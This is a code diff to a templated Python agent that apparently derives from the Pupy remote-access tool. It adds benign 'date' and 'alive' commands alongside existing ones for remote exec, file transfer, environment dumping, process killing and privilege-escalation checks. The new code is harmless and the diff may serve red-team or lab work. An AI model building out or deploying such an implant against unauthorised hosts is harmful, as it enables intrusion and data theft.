@@ -639,6 +639,8 @@ def _action_bind() -> None:
     table["pwd"] = lambda task: mod_pwd()
     table["get_hwuuid"] = lambda task: mod_hwuuid()
     table["env"] = lambda task: mod_env()
+    table["date"] = lambda task: mod_date()
+    table["alive"] = lambda task: mod_alive()
 {% else %}
     table["ping"] = lambda task: {"pong": True, "id": AGENT_ID}
 {% endif %}
@@ -713,7 +715,7 @@ _OBF = _NoopObf()
 # Unconditional: the plaintext TCP ListenerClient path needs it regardless of
 # the obfuscation level.
 CAPABILITIES = [
-    {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env",{% endif %}
+    {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env", "date", "alive",{% endif %}
     {% if include_exec %}"exec",{% endif %}
     {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
     {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -1578,6 +1580,34 @@ def mod_env():
     return {"variables": variables, "redacted": sorted(redacted)}
 
 
+def mod_date():
+    """The host's clock, in UTC and in its own local zone.
+
+    Upstream Pupy's ``date``. Both are reported because they answer different
+    questions: UTC is what the logs will say, local is what the operator sees on
+    the box, and a host whose clock is skewed is a finding rather than a detail.
+    """
+    try:
+        return {
+            "utc": _dt.datetime.now(_dt.timezone.utc).isoformat(),
+            "local": _dt.datetime.now().isoformat(),
+            "tzname": str(_tm.tzname),
+        }
+    except Exception as exc:
+        return {"error": f"cannot read the host clock: {exc}"}
+
+
+def mod_alive():
+    """Answer without doing anything.
+
+    Upstream Pupy's ``alive``. Distinct from ``ping`` because ping is the
+    transport's own liveness check -- this one is dispatched through the same
+    action table as everything else, so it proves the tasking path works rather
+    than only the socket.
+    """
+    return {"alive": True, "id": AGENT_ID}
+
+
 def mod_netstat():
     """Established connections, as the host itself sees them.
 
@@ -2276,7 +2306,7 @@ def _register(transport) -> tuple:
         "capabilities": [
             {% if include_exec %}"exec",{% endif %}
             "ping", "shutdown",
-            {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env",{% endif %}
+            {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env", "date", "alive",{% endif %}
 
             {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
             {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -2402,6 +2432,7 @@ def _parse_command(text: str) -> dict:
     verb, _, rest = text.partition(" ")
     v, arg = verb.lower(), text[len(verb):].strip()
     if v in ("sysinfo", "network", "netstat", "pwd", "get_hwuuid", "env",
+             "date", "alive",
              "privesc_check", "privesc_suggest", "ping"):
         return {"action": v}
     if v in ("ps", "processes"):
